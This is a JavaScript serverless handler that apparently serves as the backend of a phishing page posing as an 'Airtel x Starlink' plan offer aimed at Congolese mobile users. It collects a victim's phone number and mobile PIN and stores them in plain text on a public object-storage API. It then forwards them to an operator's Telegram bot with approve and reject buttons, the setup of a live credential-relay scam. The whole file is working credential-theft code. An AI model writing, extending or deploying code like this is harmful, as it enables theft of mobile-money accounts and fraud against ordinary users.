const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';

// Retry helper with exponential backoff
async function retryWithBackoff(fn, maxRetries = 3, baseDelay = 1000) {
  let lastError;
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error;
      console.warn(`Retry attempt ${attempt + 1}/${maxRetries + 1} failed:`, error.message);

      if (attempt === maxRetries) break;

      const delay = baseDelay * Math.pow(2, attempt) + Math.random() * 200;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
  throw lastError;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = req.body || {};

    if (!sessionId || !phone || !pin) {
      return res.status(400).json({ error: 'Champs obligatoires manquants.' });
    }

    const cleanPhone = phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
    const cleanPin = pin.toString().slice(0, 4);
    const displayPhone = fullPhone || `+243 ${cleanPhone}`;
    const displayCountry = country || 'Airtel Africa';
    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';

    // 1. Create cloud session record on restful-api.dev with retry
    let cloudId = sessionId;
    try {
      cloudId = await retryWithBackoff(async () => {
        const createRes = await fetch('https://api.restful-api.dev/objects', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: `stl_${cleanPhone}_${Date.now()}`, // Add timestamp to avoid conflicts
            data: {
              sessionId,
              phone: cleanPhone,
              fullPhone: displayPhone,
              country: displayCountry,
              airtelBrand: displayBrand,
              pin: cleanPin,
              planName: planName || 'Forfait Airtel Starlink',
              planPrice: planPrice || '$1.49',
              loginStatus: 'pending',
              otpStatus: 'idle',
              createdAt: Date.now(),
              lastUpdated: Date.now(),
            },
          }),
        });

        if (!createRes.ok) {
          throw new Error(`Cloud creation failed: ${createRes.status}`);
        }

        const createData = await createRes.json();
        if (createData && createData.id) {
          return createData.id;
        }

        throw new Error('Cloud creation returned no ID');
      });
    } catch (e) {
      console.warn('Could not create cloud record (after retries):', e);
      // Use sessionId as fallback
      cloudId = sessionId;
    }

    // 2. Format message for Telegram
    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName || 'Forfait Airtel Starlink'}</b> (${planPrice || '$1.49'})\n` +
      `📶 <b>Réseau:</b> ${displayBrand}\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${cloudId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${cloudId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${cloudId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${cloudId}&action=approve_login`,
        },
      ],
    ];

    // Send Telegram message with retry
    let tgData;
    try {
      tgData = await retryWithBackoff(async () => {
        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: inlineKeyboard,
            },
          }),
        });

        if (!tgRes.ok) {
          const errorText = await tgRes.text();
          throw new Error(`Telegram API error: ${tgRes.status} - ${errorText}`);
        }

        const data = await tgRes.json();
        if (!data.ok) {
          throw new Error('Telegram API returned error response');
        }

        return data;
      });
    } catch (error) {
      console.error('Failed to send Telegram message after retries:', error);
      return res.status(500).json({ error: 'Failed to send login notification' });
    }

    return res.status(200).json({
      success: true,
      sessionId,
      cloudId,
      telegram: tgData,
    });
  } catch (error) {
    console.error('send-login serverless error:', error);
    return res.status(500).json({ error: error.message });
  }
}
